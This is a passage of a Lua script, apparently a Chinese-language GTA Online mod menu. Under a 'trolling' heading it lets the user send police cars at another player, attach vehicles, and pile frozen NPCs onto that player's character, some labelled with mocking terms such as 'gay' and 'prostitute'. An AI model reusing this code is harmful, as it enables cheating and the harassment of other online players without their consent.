        pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        coffin = OBJECT.CREATE_OBJECT_NO_OFFSET(2193278353, 0, 0, 0, pos, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(coffin, pedp, 0, 0, 0, 0, 0.6, 0.0, 0, 0.0, true, true, false, 0, true)
        npc1 = PED.CLONE_PED(pedp)
        get_control_of_entity(npc1, 300)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, coffin, 0, 0, 0.25, 0, -0.4, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        get_control_of_entity(npc2, 300)
        npc2 = PED.CLONE_PED(pedp)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, coffin, 0, 0, -0.25, 0, -0.4, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        get_control_of_entity(npc3, 300)
        npc3 = PED.CLONE_PED(pedp)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, coffin, 0, 0, 0.25, 0.5, -0.4, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        get_control_of_entity(npc4, 300)
        npc4 = PED.CLONE_PED(pedp)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, coffin, 0, 0, -0.25, 0.5, -0.4, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        get_control_of_entity(npc5, 300)
        npc5 = PED.CLONE_PED(pedp)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, coffin, 0, 0, 0.22, -0.5, -0.4, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        get_control_of_entity(npc6, 300)
        npc6 = PED.CLONE_PED(pedp)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, coffin, 0, 0, -0.22, -0.5, -0.4, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
    end)
    -- 
    attacker_trolling = GT(playerMain, "红蓝爆闪", {}, "")
	GTAC(attacker_trolling, "派遣警车", {}, "", function()
        spawn_police_car(pid)
	end)
	GTAC(attacker_trolling, "删除警车", {}, "", function()
        attacker_dele()
	end)
    attach_update = GT(playerMain, "附加选项")
    GTLuaScript.list_action(attach_update, "附加车辆", {}, "", {"到他的车", "他的车到我的车", "我的车到他的车", "分离"}, function(index, value, click_type)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            pluto_switch index do
            case 1: 
                ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), car, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                break 
            case 2: 
                if player_cur_car ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(car, player_cur_car, 0, 0.0, -5.00, 0.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                end
                break
            case 3: 
                if player_cur_car ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(player_cur_car, car, 0, 0.0, -5.00, 0.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                end
                break
            case 4: 
                ENTITY.DETACH_ENTITY(car, false, false)
                if player_cur_car ~= 0 then
                    ENTITY.DETACH_ENTITY(player_cur_car, false, false)
                end
                ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
                break
            end
        end
    end)
    GTAC(attach_update, "附加祖国人", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0x348065F5, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0x348065F5, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        npc3 = createped(26, 0x348065F5, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0x348065F5, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0x348065F5, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0x348065F5, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0x348065F5, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0x348065F5, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    GTAC(attach_update, "附加外星人", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0x64611296, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0x64611296, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        npc3 = createped(26, 0x64611296, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0x64611296, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0x64611296, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0x64611296, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0x64611296, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0x64611296, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    GTAC(attach_update, "附加宇航员", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0xE7B31432, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0xE7B31432, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        npc3 = createped(26, 0xE7B31432, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0xE7B31432, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0xE7B31432, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0xE7B31432, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0xE7B31432, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0xE7B31432, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    GTAC(attach_update, "附加猴子", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0xDC59940D, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0xDC59940D, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        npc3 = createped(26, 0xDC59940D, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0xDC59940D, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0xDC59940D, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0xDC59940D, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0xDC59940D, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0xDC59940D, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    GTAC(attach_update, "附加大脚怪", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0x61D4C771, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0x61D4C771, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        npc3 = createped(26, 0x61D4C771, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0x61D4C771, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0x61D4C771, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0x61D4C771, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0x61D4C771, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0x61D4C771, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    GTAC(attach_update, "附加佩奇", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0xCE5FF074, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0xCE5FF074, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        npc3 = createped(26, 0xCE5FF074, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0xCE5FF074, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0xCE5FF074, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0xCE5FF074, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0xCE5FF074, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0xCE5FF074, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    GTAC(attach_update, "附加同性恋", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0xE0E69974, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0xE0E69974, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        npc3 = createped(26, 0xE0E69974, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0xE0E69974, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0xE0E69974, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0xE0E69974, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0xE0E69974, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0xE0E69974, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    GTAC(attach_update, "附加小丑", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0x04498DDE, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0x04498DDE, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        npc3 = createped(26, 0x04498DDE, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0x04498DDE, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0x04498DDE, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0x04498DDE, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0x04498DDE, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0x04498DDE, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    GTAC(attach_update, "附加丧尸", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0xAC4B4506, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0xAC4B4506, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        npc3 = createped(26, 0xAC4B4506, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0xAC4B4506, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0xAC4B4506, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0xAC4B4506, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0xAC4B4506, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0xAC4B4506, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    GTAC(attach_update, "附加妓女", {}, "", function(f)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        npc1 = createped(26, 0x9CF26183, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, pedp, 0, 0, 0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        npc2 = createped(26, 0x9CF26183, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, pedp, 0, 0, 0.00, 0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
